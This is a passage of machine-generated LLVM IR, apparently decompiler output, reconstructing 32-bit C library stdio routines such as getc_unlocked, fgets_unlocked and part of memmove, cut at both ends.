  %v4_804c271 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134525440, i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  %v1_804c27b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8053474.92 to i32))
  %v0_804c280 = load i32, i32* @global_var_80537c8.93, align 8
  %v1_804c285 = add i32 %v0_804c280, 1
  store i32 %v1_804c285, i32* @global_var_80537c8.93, align 8
  %v3_804c28e = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v4_804c29e = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134525440, i32 ptrtoint (i32* @global_var_805345c.96 to i32))
  %v1_804c2ab = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805345c.96 to i32))
  %v0_804c2b0 = load i32, i32* bitcast (i32** @global_var_8053458.97 to i32*), align 8
  store i32 %v0_804c2b0, i32* @esi, align 4
  %v3_804c2b9 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 0, i32* @edi, align 4
  store i32 %v2_804c26c, i32* @ebp, align 4
  %v0_804c31d1 = load i32, i32* @esi, align 4
  %v1_804c31d2 = icmp eq i32 %v0_804c31d1, 0
  %v1_804c31f9 = icmp eq i1 %v1_804c31d2, false
  br i1 %v1_804c31f9, label %dec_label_pc_804c2c7, label %dec_label_pc_804c321

dec_label_pc_804c2c7:                             ; preds = %dec_label_pc_804c262, %dec_label_pc_804c31a
  %v0_804c2cc = phi i32 [ %v3_804c31a, %dec_label_pc_804c31a ], [ %v0_804c31d1, %dec_label_pc_804c262 ]
  %v1_804c2c7 = inttoptr i32 %v0_804c2cc to i8*
  %v2_804c2c7 = load i8, i8* %v1_804c2c7, align 1
  %v3_804c2c7 = and i8 %v2_804c2c7, 64
  %v4_804c2c7 = icmp eq i8 %v3_804c2c7, 0
  br i1 %v4_804c2c7, label %dec_label_pc_804c31a, label %dec_label_pc_804c2cc

dec_label_pc_804c2cc:                             ; preds = %dec_label_pc_804c2c7
  %v1_804c2cc = add i32 %v0_804c2cc, 56
  store i32 %v1_804c2cc, i32* @ebx, align 4
  %v4_804c2d6 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134525440, i32 %v1_804c2cc)
  %v0_804c2db = load i32, i32* @ebx, align 4
  %v1_804c2dc = call i32 @__pthread_return_0(i32 %v0_804c2db)
  %v6_804c2e1 = and i32 %v1_804c2dc, -65536
  %v7_804c2e1 = or i32 %v6_804c2e1, %stack_var_-34.0
  %v1_804c2e6 = load i32, i32* @esi, align 4
  %v2_804c2e6 = inttoptr i32 %v1_804c2e6 to i32*
  %v3_804c2e6 = load i32, i32* %v2_804c2e6, align 4
  %v4_804c2e6 = or i32 %v3_804c2e6, %v7_804c2e1
  %v2_804c2e8 = urem i32 %v4_804c2e6, 65536
  %v9_804c2e8 = and i32 %v2_804c2e8, 832
  %v2_804c2ef = icmp eq i32 %v9_804c2e8, 320
  %v1_804c2f4 = icmp eq i1 %v2_804c2ef, false
  br i1 %v1_804c2f4, label %dec_label_pc_804c310, label %dec_label_pc_804c2f6

dec_label_pc_804c2f6:                             ; preds = %dec_label_pc_804c2cc
  %v1_804c2f7 = call i32 @__stdio_wcommit(i32 %v1_804c2e6)
  store i32 %v1_804c2e6, i32* @ecx, align 4
  %v1_804c2fd = icmp eq i32 %v1_804c2f7, 0
  br i1 %v1_804c2fd, label %dec_label_pc_804c306, label %dec_label_pc_804c301

dec_label_pc_804c301:                             ; preds = %dec_label_pc_804c2f6
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804c310

dec_label_pc_804c306:                             ; preds = %dec_label_pc_804c2f6
  %v0_804c306 = load i32, i32* @esi, align 4
  %v1_804c306 = add i32 %v0_804c306, 8
  %v2_804c306 = inttoptr i32 %v1_804c306 to i32*
  %v3_804c306 = load i32, i32* %v2_804c306, align 4
  %v2_804c309 = add i32 %v0_804c306, 28
  %v3_804c309 = inttoptr i32 %v2_804c309 to i32*
  store i32 %v3_804c306, i32* %v3_804c309, align 4
  %v0_804c30c = load i32, i32* @esi, align 4
  %v1_804c30c = inttoptr i32 %v0_804c30c to i16*
  %v2_804c30c = load i16, i16* %v1_804c30c, align 2
  %v3_804c30c = and i16 %v2_804c30c, -65
  store i16 %v3_804c30c, i16* %v1_804c30c, align 2
  br label %dec_label_pc_804c310

dec_label_pc_804c310:                             ; preds = %dec_label_pc_804c2cc, %dec_label_pc_804c301, %dec_label_pc_804c306
  %v3_804c313 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_804c31a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c31a

dec_label_pc_804c31a:                             ; preds = %dec_label_pc_804c2c7, %dec_label_pc_804c310
  %v0_804c31a = phi i32 [ %v0_804c2cc, %dec_label_pc_804c2c7 ], [ %v0_804c31a.pre, %dec_label_pc_804c310 ]
  %v1_804c31a = add i32 %v0_804c31a, 32
  %v2_804c31a = inttoptr i32 %v1_804c31a to i32*
  %v3_804c31a = load i32, i32* %v2_804c31a, align 4
  store i32 %v3_804c31a, i32* @esi, align 4
  %v1_804c31d = icmp eq i32 %v3_804c31a, 0
  %v1_804c31f = icmp eq i1 %v1_804c31d, false
  br i1 %v1_804c31f, label %dec_label_pc_804c2c7, label %dec_label_pc_804c321

dec_label_pc_804c321:                             ; preds = %dec_label_pc_804c31a, %dec_label_pc_804c262
  %v0_804c321 = call i32 @_stdio_openlist_dec_use()
  %v0_804c349.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c349

dec_label_pc_804c328:                             ; preds = %dec_label_pc_804c253
  %tmp30 = bitcast i16* %arg1 to i8*
  %v3_804c32a = load i8, i8* %tmp30, align 1
  %v4_804c32a = and i8 %v3_804c32a, 64
  %v5_804c32a = icmp eq i8 %v4_804c32a, 0
  br i1 %v5_804c32a, label %dec_label_pc_804c349, label %dec_label_pc_804c32f

dec_label_pc_804c32f:                             ; preds = %dec_label_pc_804c328
  %v1_804c330 = call i32 @__stdio_wcommit(i32 %v4_804c240)
  %v1_804c339 = icmp eq i32 %v1_804c330, 0
  %v1_804c33b = icmp eq i1 %v1_804c339, false
  br i1 %v1_804c33b, label %dec_label_pc_804c349, label %dec_label_pc_804c33d

dec_label_pc_804c33d:                             ; preds = %dec_label_pc_804c32f
  %v2_804c33d = add i32 %v4_804c240, 8
  %v3_804c33d = inttoptr i32 %v2_804c33d to i32*
  %v4_804c33d = load i32, i32* %v3_804c33d, align 4
  %v3_804c340 = add i32 %v4_804c240, 28
  %v4_804c340 = inttoptr i32 %v3_804c340 to i32*
  store i32 %v4_804c33d, i32* %v4_804c340, align 4
  %v3_804c343 = load i16, i16* %arg1, align 2
  %v4_804c343 = and i16 %v3_804c343, -65
  store i16 %v4_804c343, i16* %arg1, align 2
  br label %dec_label_pc_804c349

dec_label_pc_804c349:                             ; preds = %dec_label_pc_804c32f, %dec_label_pc_804c328, %dec_label_pc_804c321, %dec_label_pc_804c33d
  %v0_804c349 = phi i32 [ -1, %dec_label_pc_804c32f ], [ 0, %dec_label_pc_804c328 ], [ %v0_804c349.pre, %dec_label_pc_804c321 ], [ 0, %dec_label_pc_804c33d ]
  store i32 %v0_804c23c, i32* @ebx, align 4
  store i32 %v0_804c23b, i32* @esi, align 4
  store i32 %v0_804c23a, i32* @edi, align 4
  store i32 %v0_804c239, i32* @ebp, align 4
  ret i32 %v0_804c349

; uselistorder directives
  uselistorder i32 %v3_804c31a, { 1, 2, 0 }
  uselistorder i32 %v4_804c240, { 1, 0, 2, 3 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_8053458.97 to i32*), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_805345c.96 to i32), { 3, 0, 4, 1, 6, 5, 2 }
  uselistorder i32* @global_var_80537c8.93, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_8053474.92 to i32), { 5, 0, 6, 1, 7, 2, 8, 4, 9, 3 }
  uselistorder i16* %arg1, { 1, 4, 3, 2, 0, 5 }
  uselistorder label %dec_label_pc_804c349, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c31a, { 1, 0 }
  uselistorder label %dec_label_pc_804c310, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c2c7, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v0_804c354 = load i32, i32* @ebx, align 4
  %v4_804c358 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804c358, i32* @ebx, align 4
  %v1_804c35c = add i32 %v4_804c358, 16
  %v2_804c35c = inttoptr i32 %v1_804c35c to i32*
  %v3_804c35c = load i32, i32* %v2_804c35c, align 4
  %v2_804c35f = add i32 %v4_804c358, 24
  %v3_804c35f = inttoptr i32 %v2_804c35f to i32*
  %v4_804c35f = load i32, i32* %v3_804c35f, align 4
  %v10_804c35f = icmp ult i32 %v3_804c35c, %v4_804c35f
  br i1 %v10_804c35f, label %dec_label_pc_804c3f4, label %dec_label_pc_804c368

dec_label_pc_804c368:                             ; preds = %entry
  %v2_804c368 = load i16, i16* %arg1, align 2
  %v3_804c368 = zext i16 %v2_804c368 to i32
  %v1_804c36b = and i32 %v3_804c368, 131
  %v6_804c375 = icmp ugt i32 %v1_804c36b, 128
  br i1 %v6_804c375, label %dec_label_pc_804c38c, label %dec_label_pc_804c377

dec_label_pc_804c377:                             ; preds = %dec_label_pc_804c368
  %v6_804c37d = call i32 @__stdio_trans2r_o(i16* nonnull %arg1, i32 128, i32 %v0_804c354)
  %v3_804c382 = ptrtoint i16* %arg1 to i32
  store i32 %v3_804c382, i32* %edx.global-to-local, align 4
  store i32 128, i32* @ecx, align 4
  %v1_804c384 = icmp eq i32 %v6_804c37d, 0
  %v1_804c386 = icmp eq i1 %v1_804c384, false
  br i1 %v1_804c386, label %dec_label_pc_804c418, label %dec_label_pc_804c377.dec_label_pc_804c38c_crit_edge

dec_label_pc_804c377.dec_label_pc_804c38c_crit_edge: ; preds = %dec_label_pc_804c377
  %v0_804c38c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c38c

dec_label_pc_804c38c:                             ; preds = %dec_label_pc_804c377.dec_label_pc_804c38c_crit_edge, %dec_label_pc_804c368
  %v2_804c3c0 = phi i32 [ %v0_804c38c.pre, %dec_label_pc_804c377.dec_label_pc_804c38c_crit_edge ], [ %v4_804c358, %dec_label_pc_804c368 ]
  %v1_804c38c = inttoptr i32 %v2_804c3c0 to i32*
  %v2_804c38c = load i32, i32* %v1_804c38c, align 4
  store i32 %v2_804c38c, i32* @ecx, align 4
  %v1_804c38e = urem i32 %v2_804c38c, 65536
  store i32 %v1_804c38e, i32* %edx.global-to-local, align 4
  %v2_804c391 = and i32 %v2_804c38c, 2
  %v3_804c391 = icmp eq i32 %v2_804c391, 0
  br i1 %v3_804c391, label %dec_label_pc_804c3af, label %dec_label_pc_804c396

dec_label_pc_804c396:                             ; preds = %dec_label_pc_804c38c
  %v1_804c396 = urem i32 %v2_804c38c, 2
  store i32 %v1_804c396, i32* %edx.global-to-local, align 4
  %tmp16 = sub nsw i32 0, %v1_804c396
  %v2_804c399 = and i32 %tmp16, 4
  %v3_804c399 = add i32 %v2_804c3c0, 36
  %v4_804c399 = add i32 %v3_804c399, %v2_804c399
  %v5_804c399 = inttoptr i32 %v4_804c399 to i8*
  %v6_804c399 = load i8, i8* %v5_804c399, align 1
  %v7_804c399 = zext i8 %v6_804c399 to i32
  store i32 %v7_804c399, i32* %edx.global-to-local, align 4
  %v1_804c39d = add i32 %v2_804c38c, 65535
  %v1_804c3a0 = trunc i32 %v1_804c39d to i16
  %v3_804c3a0 = inttoptr i32 %v2_804c3c0 to i16*
  store i16 %v1_804c3a0, i16* %v3_804c3a0, align 2
  %v0_804c3a3 = load i32, i32* @ebx, align 4
  %v1_804c3a3 = add i32 %v0_804c3a3, 40
  %v2_804c3a3 = inttoptr i32 %v1_804c3a3 to i32*
  store i32 0, i32* %v2_804c3a3, align 4
  %v0_804c3aa = load i32, i32* %edx.global-to-local, align 4
  %v1_804c3aa = urem i32 %v0_804c3aa, 256
  store i32 %v1_804c3aa, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c41b

dec_label_pc_804c3af:                             ; preds = %dec_label_pc_804c38c
  %v1_804c3af = add i32 %v2_804c3c0, 16
  %v2_804c3af = inttoptr i32 %v1_804c3af to i32*
  %v3_804c3af = load i32, i32* %v2_804c3af, align 4
  %v1_804c3b2 = add i32 %v2_804c3c0, 20
  %v2_804c3b2 = inttoptr i32 %v1_804c3b2 to i32*
  %v3_804c3b2 = load i32, i32* %v2_804c3b2, align 4
  %v15_804c3b2 = icmp eq i32 %v3_804c3b2, %v3_804c3af
  %v1_804c3b5 = icmp eq i1 %v15_804c3b2, false
  br i1 %v1_804c3b5, label %dec_label_pc_804c3f4, label %dec_label_pc_804c3b7

dec_label_pc_804c3b7:                             ; preds = %dec_label_pc_804c3af
  %v1_804c3b7 = add i32 %v2_804c3c0, 4
  %v2_804c3b7 = inttoptr i32 %v1_804c3b7 to i32*
  %v3_804c3b7 = load i32, i32* %v2_804c3b7, align 4
  %v13_804c3b7 = icmp eq i32 %v3_804c3b7, -2
  %v1_804c3bb = icmp eq i1 %v13_804c3b7, false
  br i1 %v1_804c3bb, label %dec_label_pc_804c3c5, label %dec_label_pc_804c3bd

dec_label_pc_804c3bd:                             ; preds = %dec_label_pc_804c3b7
  %v1_804c3bd = or i32 %v2_804c38c, 4
  store i32 %v1_804c3bd, i32* @ecx, align 4
  %v1_804c3c0 = trunc i32 %v1_804c3bd to i16
  %v3_804c3c0 = inttoptr i32 %v2_804c3c0 to i16*
  store i16 %v1_804c3c0, i16* %v3_804c3c0, align 2
  br label %dec_label_pc_804c418

dec_label_pc_804c3c5:                             ; preds = %dec_label_pc_804c3b7
  %v1_804c3c5 = udiv i32 %v2_804c38c, 256
  %v2_804c3c5 = trunc i32 %v1_804c3c5 to i8
  %v3_804c3c5 = urem i8 %v2_804c3c5, 4
  %v4_804c3c5 = icmp eq i8 %v3_804c3c5, 0
  %v8_804c3c5 = zext i8 %v3_804c3c5 to i32
  %v10_804c3c5 = mul nuw nsw i32 %v8_804c3c5, 256
  %v11_804c3c5 = urem i32 %v2_804c38c, 256
  %v12_804c3c5 = or i32 %v10_804c3c5, %v11_804c3c5
  store i32 %v12_804c3c5, i32* %edx.global-to-local, align 4
  br i1 %v4_804c3c5, label %dec_label_pc_804c3d5, label %dec_label_pc_804c3ca

dec_label_pc_804c3ca:                             ; preds = %dec_label_pc_804c3c5
  %v3_804c3cf = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8053458.97 to i16*))
  %v0_804c3d5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c3d5

dec_label_pc_804c3d5:                             ; preds = %dec_label_pc_804c3c5, %dec_label_pc_804c3ca
  %v0_804c404 = phi i32 [ %v2_804c3c0, %dec_label_pc_804c3c5 ], [ %v0_804c3d5.pre, %dec_label_pc_804c3ca ]
  %v1_804c3d5 = add i32 %v0_804c404, 8
  %v2_804c3d5 = inttoptr i32 %v1_804c3d5 to i32*
  %v3_804c3d5 = load i32, i32* %v2_804c3d5, align 4
  %v1_804c3d8 = add i32 %v0_804c404, 12
  %v2_804c3d8 = inttoptr i32 %v1_804c3d8 to i32*
  %v3_804c3d8 = load i32, i32* %v2_804c3d8, align 4
  %v15_804c3d8 = icmp eq i32 %v3_804c3d8, %v3_804c3d5
  br i1 %v15_804c3d8, label %dec_label_pc_804c3fd, label %dec_label_pc_804c3dd

dec_label_pc_804c3dd:                             ; preds = %dec_label_pc_804c3d5
  %v2_804c3dd = add i32 %v0_804c404, 24
  %v3_804c3dd = inttoptr i32 %v2_804c3dd to i32*
  store i32 %v3_804c3d5, i32* %v3_804c3dd, align 4
  %v0_804c3e0 = load i32, i32* @ebx, align 4
  %v2_804c3e1 = call i32 @__stdio_rfill(i32 %v0_804c3e0)
  store i32 %v0_804c3e0, i32* @ecx, align 4
  %v1_804c3e7 = icmp eq i32 %v2_804c3e1, 0
  br i1 %v1_804c3e7, label %dec_label_pc_804c418, label %dec_label_pc_804c3eb

dec_label_pc_804c3eb:                             ; preds = %dec_label_pc_804c3dd
  %v0_804c3eb = load i32, i32* @ebx, align 4
  %v1_804c3eb = add i32 %v0_804c3eb, 20
  %v2_804c3eb = inttoptr i32 %v1_804c3eb to i32*
  %v3_804c3eb = load i32, i32* %v2_804c3eb, align 4
  %v2_804c3ee = add i32 %v0_804c3eb, 24
  %v3_804c3ee = inttoptr i32 %v2_804c3ee to i32*
  store i32 %v3_804c3eb, i32* %v3_804c3ee, align 4
  %v0_804c3f1 = load i32, i32* @ebx, align 4
  %v1_804c3f1 = add i32 %v0_804c3f1, 16
  %v2_804c3f1 = inttoptr i32 %v1_804c3f1 to i32*
  %v3_804c3f1 = load i32, i32* %v2_804c3f1, align 4
  br label %dec_label_pc_804c3f4

dec_label_pc_804c3f4:                             ; preds = %dec_label_pc_804c3af, %entry, %dec_label_pc_804c3eb
  %v1_804c3f8 = phi i32 [ %v2_804c3c0, %dec_label_pc_804c3af ], [ %v4_804c358, %entry ], [ %v0_804c3f1, %dec_label_pc_804c3eb ]
  %v0_804c3f4 = phi i32 [ %v3_804c3af, %dec_label_pc_804c3af ], [ %v3_804c35c, %entry ], [ %v3_804c3f1, %dec_label_pc_804c3eb ]
  %v1_804c3f4 = inttoptr i32 %v0_804c3f4 to i8*
  %v2_804c3f4 = load i8, i8* %v1_804c3f4, align 1
  %v3_804c3f4 = zext i8 %v2_804c3f4 to i32
  store i32 %v3_804c3f4, i32* %edx.global-to-local, align 4
  %v1_804c3f7 = add i32 %v0_804c3f4, 1
  %v2_804c3f8 = add i32 %v1_804c3f8, 16
  %v3_804c3f8 = inttoptr i32 %v2_804c3f8 to i32*
  store i32 %v1_804c3f7, i32* %v3_804c3f8, align 4
  %v0_804c41b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c41b

dec_label_pc_804c3fd:                             ; preds = %dec_label_pc_804c3d5
  %v2_804c3ff = ptrtoint i8* %stack_var_-5 to i32
  %v5_804c404 = inttoptr i32 %v0_804c404 to i16*
  %v7_804c405 = call i32 @__stdio_READ(i16* %v5_804c404, i32 %v2_804c3ff, i32 1)
  %v1_804c40d = icmp eq i32 %v7_804c405, 0
  br i1 %v1_804c40d, label %dec_label_pc_804c418, label %dec_label_pc_804c411

dec_label_pc_804c411:                             ; preds = %dec_label_pc_804c3fd
  %v3_804c411 = load i8, i8* %stack_var_-5, align 1
  %v4_804c411 = sext i8 %v3_804c411 to i32
  store i32 %v4_804c411, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c41b

dec_label_pc_804c418:                             ; preds = %dec_label_pc_804c3fd, %dec_label_pc_804c3dd, %dec_label_pc_804c377, %dec_label_pc_804c3bd
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c41b

dec_label_pc_804c41b:                             ; preds = %dec_label_pc_804c411, %dec_label_pc_804c3f4, %dec_label_pc_804c396, %dec_label_pc_804c418
  %v0_804c41b = phi i32 [ %v4_804c411, %dec_label_pc_804c411 ], [ %v0_804c41b.pre, %dec_label_pc_804c3f4 ], [ %v1_804c3aa, %dec_label_pc_804c396 ], [ -1, %dec_label_pc_804c418 ]
  %v2_804c41d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c41d, i32* %edx.global-to-local, align 4
  store i32 %v0_804c354, i32* @ebx, align 4
  ret i32 %v0_804c41b

; uselistorder directives
  uselistorder i32 %v0_804c3f4, { 1, 0 }
  uselistorder i32 %v3_804c3d5, { 1, 0 }
  uselistorder i32 %v0_804c404, { 0, 1, 3, 2 }
  uselistorder i8 %v3_804c3c5, { 1, 0 }
  uselistorder i32 %v3_804c3af, { 1, 0 }
  uselistorder i32 %v1_804c3aa, { 1, 0 }
  uselistorder i32 %v1_804c396, { 1, 0 }
  uselistorder i32 %v2_804c38c, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_804c3c0, { 1, 2, 3, 4, 6, 5, 7, 0, 8 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_8053490.82, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_804c41b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c418, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804c3f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c3d5, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804c420 = load i32, i32* @ebp, align 4
  %v4_804c424 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804c424, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804c424, i32* @ebx, align 4
  %tmp17 = icmp slt i32 %arg2, 1
  %tmp18 = icmp eq i1 %tmp17, false
  br i1 %tmp18, label %dec_label_pc_804c469.preheader, label %dec_label_pc_804c475

dec_label_pc_804c469.preheader:                   ; preds = %entry
  %v1_804c46920 = add i32 %arg2, -1
  %v8_804c46921 = icmp eq i32 %v1_804c46920, 0
  store i32 %v1_804c46920, i32* @esi, align 4
  %v1_804c46a22 = icmp eq i1 %v8_804c46921, false
  br i1 %v1_804c46a22, label %dec_label_pc_804c438, label %dec_label_pc_804c46c

dec_label_pc_804c438:                             ; preds = %dec_label_pc_804c469.preheader, %dec_label_pc_804c467.dec_label_pc_804c469_crit_edge.dec_label_pc_804c438_crit_edge
  %v0_804c438 = phi i32 [ %v0_804c438.pre, %dec_label_pc_804c467.dec_label_pc_804c469_crit_edge.dec_label_pc_804c438_crit_edge ], [ %arg3, %dec_label_pc_804c469.preheader ]
  %v1_804c438 = add i32 %v0_804c438, 16
  %v2_804c438 = inttoptr i32 %v1_804c438 to i32*
  %v3_804c438 = load i32, i32* %v2_804c438, align 4
  store i32 %v3_804c438, i32* %eax.global-to-local, align 4
  %v2_804c43b = add i32 %v0_804c438, 24
  %v3_804c43b = inttoptr i32 %v2_804c43b to i32*
  %v4_804c43b = load i32, i32* %v3_804c43b, align 4
  %v10_804c43b = icmp ult i32 %v3_804c438, %v4_804c43b
  %v1_804c43e = icmp eq i1 %v10_804c43b, false
  br i1 %v1_804c43e, label %dec_label_pc_804c44e, label %dec_label_pc_804c440

dec_label_pc_804c440:                             ; preds = %dec_label_pc_804c438
  %v1_804c440 = inttoptr i32 %v3_804c438 to i8*
  %v2_804c440 = load i8, i8* %v1_804c440, align 1
  %v3_804c440 = zext i8 %v2_804c440 to i32
  %v4_804c440 = load i32, i32* @edx, align 4
  %v5_804c440 = and i32 %v4_804c440, -256
  %v6_804c440 = or i32 %v5_804c440, %v3_804c440
  store i32 %v6_804c440, i32* @edx, align 4
  %v2_804c442 = load i32, i32* @ebx, align 4
  %v3_804c442 = inttoptr i32 %v2_804c442 to i8*
  store i8 %v2_804c440, i8* %v3_804c442, align 1
  %v0_804c444 = load i32, i32* @ebx, align 4
  %v1_804c444 = add i32 %v0_804c444, 1
  store i32 %v1_804c444, i32* @ebx, align 4
  %v0_804c445 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c445 = add i32 %v0_804c445, 1
  store i32 %v1_804c445, i32* %eax.global-to-local, align 4
  %v1_804c446 = load i32, i32* @ebp, align 4
  %v2_804c446 = add i32 %v1_804c446, 16
  %v3_804c446 = inttoptr i32 %v2_804c446 to i32*
  store i32 %v1_804c445, i32* %v3_804c446, align 4
  %v0_804c449 = load i32, i32* @edx, align 4
  %v1_804c449 = trunc i32 %v0_804c449 to i8
  br label %dec_label_pc_804c467

dec_label_pc_804c44e:                             ; preds = %dec_label_pc_804c438
  %tmp19 = inttoptr i32 %v0_804c438 to i16*
  %v3_804c44f = call i32 @getc_unlocked(i16* %tmp19)
  %v4_804c44f = trunc i32 %v3_804c44f to i8
  store i32 %v3_804c44f, i32* %eax.global-to-local, align 4
  store i32 %v0_804c438, i32* @edx, align 4
  %sext.mask = urem i32 %v3_804c44f, 256
  %v11_804c455 = icmp eq i32 %sext.mask, 255
  %v1_804c458 = icmp eq i1 %v11_804c455, false
  br i1 %v1_804c458, label %dec_label_pc_804c462, label %dec_label_pc_804c45a

dec_label_pc_804c45a:                             ; preds = %dec_label_pc_804c44e
  %v0_804c45a = load i32, i32* @ebp, align 4
  %v1_804c45a = inttoptr i32 %v0_804c45a to i8*
  %v2_804c45a = load i8, i8* %v1_804c45a, align 1
  %v3_804c45a = and i8 %v2_804c45a, 8
  %v4_804c45a = icmp eq i8 %v3_804c45a, 0
  br i1 %v4_804c45a, label %dec_label_pc_804c46c, label %dec_label_pc_804c475

dec_label_pc_804c462:                             ; preds = %dec_label_pc_804c44e
  %v3_804c462 = load i32, i32* @ebx, align 4
  %v4_804c462 = inttoptr i32 %v3_804c462 to i8*
  store i8 %v4_804c44f, i8* %v4_804c462, align 1
  %v0_804c464 = load i32, i32* @ebx, align 4
  %v1_804c464 = add i32 %v0_804c464, 1
  store i32 %v1_804c464, i32* @ebx, align 4
  br label %dec_label_pc_804c467

dec_label_pc_804c467:                             ; preds = %dec_label_pc_804c440, %dec_label_pc_804c462
  %storemerge6.in = phi i8 [ %v4_804c44f, %dec_label_pc_804c462 ], [ %v1_804c449, %dec_label_pc_804c440 ]
  %storemerge4 = icmp eq i8 %storemerge6.in, 10
  br i1 %storemerge4, label %dec_label_pc_804c46c, label %dec_label_pc_804c467.dec_label_pc_804c469_crit_edge

dec_label_pc_804c467.dec_label_pc_804c469_crit_edge: ; preds = %dec_label_pc_804c467
  %v0_804c469.pre = load i32, i32* @esi, align 4
  %v1_804c469 = add i32 %v0_804c469.pre, -1
  %v8_804c469 = icmp eq i32 %v1_804c469, 0
  store i32 %v1_804c469, i32* @esi, align 4
  %v1_804c46a = icmp eq i1 %v8_804c469, false
  br i1 %v1_804c46a, label %dec_label_pc_804c467.dec_label_pc_804c469_crit_edge.dec_label_pc_804c438_crit_edge, label %dec_label_pc_804c46c

dec_label_pc_804c467.dec_label_pc_804c469_crit_edge.dec_label_pc_804c438_crit_edge: ; preds = %dec_label_pc_804c467.dec_label_pc_804c469_crit_edge
  %v0_804c438.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804c438

dec_label_pc_804c46c:                             ; preds = %dec_label_pc_804c469.preheader, %dec_label_pc_804c467.dec_label_pc_804c469_crit_edge, %dec_label_pc_804c467, %dec_label_pc_804c45a
  %v0_804c46c = load i32, i32* @ebx, align 4
  %v1_804c46c = load i32, i32* @edi, align 4
  %tmp24 = icmp ugt i32 %v0_804c46c, %v1_804c46c
  br i1 %tmp24, label %dec_label_pc_804c470, label %dec_label_pc_804c475

dec_label_pc_804c470:                             ; preds = %dec_label_pc_804c46c
  %v1_804c470 = inttoptr i32 %v0_804c46c to i8*
  store i8 0, i8* %v1_804c470, align 1
  %v0_804c477.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c477

dec_label_pc_804c475:                             ; preds = %dec_label_pc_804c46c, %dec_label_pc_804c45a, %entry
  br label %dec_label_pc_804c477

dec_label_pc_804c477:                             ; preds = %dec_label_pc_804c470, %dec_label_pc_804c475
  %v0_804c477 = phi i32 [ %v0_804c477.pre, %dec_label_pc_804c470 ], [ 0, %dec_label_pc_804c475 ]
  store i32 %v0_804c477, i32* %eax.global-to-local, align 4
  store i32 %v0_804c420, i32* @ebp, align 4
  ret i32 %v0_804c477

; uselistorder directives
  uselistorder i32 %v0_804c477, { 1, 0 }
  uselistorder i32 %v0_804c46c, { 1, 0 }
  uselistorder i32 %v1_804c469, { 1, 0 }
  uselistorder i32 %v3_804c44f, { 0, 2, 1 }
  uselistorder i32 %v0_804c438, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804c477, { 1, 0 }
  uselistorder label %dec_label_pc_804c46c, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804c467, { 1, 0 }
  uselistorder label %dec_label_pc_804c438, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804c481 = load i32, i32* @esi, align 4
  store i32 %v0_804c481, i32* %stack_var_-8, align 4
  %v4_804c482 = ptrtoint i8* %arg1 to i32
  %v13_804c490 = icmp eq i32 %v4_804c482, %arg2
  br i1 %v13_804c490, label %dec_label_pc_804c4a2, label %dec_label_pc_804c494

dec_label_pc_804c494:                             ; preds = %entry
  %v8_804c490 = icmp ult i32 %v4_804c482, %arg2
  br i1 %v8_804c490, label %dec_label_pc_804c49f, label %dec_label_pc_804c496

dec_label_pc_804c496:                             ; preds = %dec_label_pc_804c494
  %v2_804c496 = add i32 %arg2, -1
  %v3_804c496 = add i32 %v2_804c496, %tmp
  %v3_804c49a = add i32 %v4_804c482, -1
  %v4_804c49a = add i32 %v3_804c49a, %tmp
  br label %dec_label_pc_804c49f

dec_label_pc_804c49f:                             ; preds = %dec_label_pc_804c494, %dec_label_pc_804c496
  %v1_804c49f = phi i32 [ %arg2, %dec_label_pc_804c494 ], [ %v3_804c496, %dec_label_pc_804c496 ]
